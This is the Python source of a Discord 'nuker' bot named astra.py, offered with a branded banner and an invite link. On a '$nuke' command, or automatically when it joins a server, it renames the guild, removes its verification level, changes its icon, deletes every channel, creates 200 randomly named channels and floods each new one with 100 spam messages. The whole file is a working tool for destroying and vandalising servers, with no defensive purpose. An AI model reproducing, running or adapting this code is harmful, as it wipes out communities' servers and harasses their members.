import json
import asyncio
import time
import discord
import string
import random
import os
from discord.ext import commands
import ctypes
from pystyle import Colors, Center, Colorate, Write
import aiohttp
from dataclasses import dataclass

@dataclass
class Config:
    pfp_url: str
    nuke_on_join: bool
    rename_guild: bool
    channel_names: int
    text: str
    token: str

def load_config():
    with open("config.json", "r") as f:
        config_data = json.load(f)
    return Config(**config_data)

config = load_config()

intents = discord.Intents.all()

astrapy = commands.Bot(command_prefix="$", intents=intents)
astrapy.remove_command('help')

def generate_random_string(length=10):
    ascii_chars = 'ءآأؤإئابةتثجحخدذرزسشصضطظعغفقكلمنهوي'
    return ''.join(random.choice(ascii_chars) for i in range(length))

def set_console_title(title):
    ctypes.windll.kernel32.SetConsoleTitleW(title)

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

async def delete_channels(guild):
    Write.Print("[-] Service Started: Deleting Channels.\n", Colors.cyan, interval=0.00000001)
    await asyncio.gather(*[channel.delete() for channel in guild.channels])

async def create_channels(guild, num_channels):
    Write.Print("[+] Service Started: Creating Channels.\n", Colors.green, interval=0.00000001)
    await asyncio.gather(*[guild.create_text_channel(name=generate_random_string()) for _ in range(num_channels)])

async def send_messages(channel, num_messages):
    Write.Print("[+] Service Started: Spamming Messages.", Colors.blue, interval=0.00000001)
    for _ in range(num_messages):
        try:
            await channel.send(config.text)
        except discord.errors.HTTPException as e:
            if e.status == 429:
                Write.Print(f"[!] Service Error: Rate Limited!", Colors.red, interval=0.00000001)
            else:
                Write.Print(f"[!] Service Error: Error Rate Limited", Colors.red, interval=0.00000001)

@astrapy.event
async def on_ready():
    clear_console()
    set_console_title("astra.py ~ Nuker.py")

    banner = Center.XCenter("""
    _______       _____                   _____   __      ______              
    ___    |________  /_____________ _    ___  | / /___  ____  /______________
    __  /| |_  ___/  __/_  ___/  __ `/    __   |/ /_  / / /_  //_/  _ \_  ___/
    _  ___ |(__  )/ /_ _  /   / /_/ /     _  /|  / / /_/ /_  ,<  /  __/  /    
    /_/  |_/____/ \__/ /_/    \__,_/      /_/ |_/  \__,_/ /_/|_| \___//_/     
                                                                          
                Made By astra.py | Discord discord.gg/A5XW5RwMM4
                      Invite the bot or use $nuke to start\n      
    """)
    print(Colorate.Vertical(Colors.red_to_purple, banner, 2))

@astrapy.event
async def on_guild_channel_create(channel):
    await send_messages(channel, 100)

@astrapy.command()
async def nuke(ctx):
    print(f" ", Colors.red)
    Write.Print(f"[/] Nuke activated ~ Preparing for the attack.\n", Colors.red, interval=0.00000001)

    await ctx.message.delete()

    try:
        await ctx.guild.edit(name=generate_random_string(), verification_level=discord.VerificationLevel.none)
        Write.Print("[+] Service Started: Renaming Guild\n", Colors.dark_green, interval=0.00000001)
    except Exception as e:
        Write.Print(f"[!] Service Error: Error editing guild: {e}\n", Colors.red, interval=0.00000001)

    if discord.VerificationLevel.none:
        Write.Print("[+] Service Started: Edited Verification Level\n", Colors.yellow, interval=0.00000001)

    if config.pfp_url and config.pfp_url.strip() != "":
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(config.pfp_url) as resp:
                    pfp_data = await resp.read()
                    await ctx.guild.edit(icon=pfp_data)
            Write.Print("[+] Service Started: Changed Server PFP\n", Colors.purple, interval=0.00000001)
        except Exception as e:
            Write.Print(f"[!] Service Error: Error changing Server PFP: {e}\n", Colors.red, interval=0.00000001)

    await delete_channels(ctx.guild)
    await create_channels(ctx.guild, 200)

@astrapy.event
async def on_guild_join(guild):
    if config.nuke_on_join:
        try:
            await guild.edit(name=generate_random_string(), verification_level=discord.VerificationLevel.none)
            Write.Print("[+] Service Started: Renaming Guild\n", Colors.dark_green, interval=0.00000001)

            if discord.VerificationLevel.none:
                Write.Print("[+] Service Started: Edited Verification Level\n", Colors.red, interval=0.00000001)

            await delete_channels(guild)
            await create_channels(guild, 200)
        except Exception as e:
            Write.Print(f"[!] Service Error: Error editing guild: {e}\n", Colors.red, interval=0.00000001)

astrapy.run(config.token)
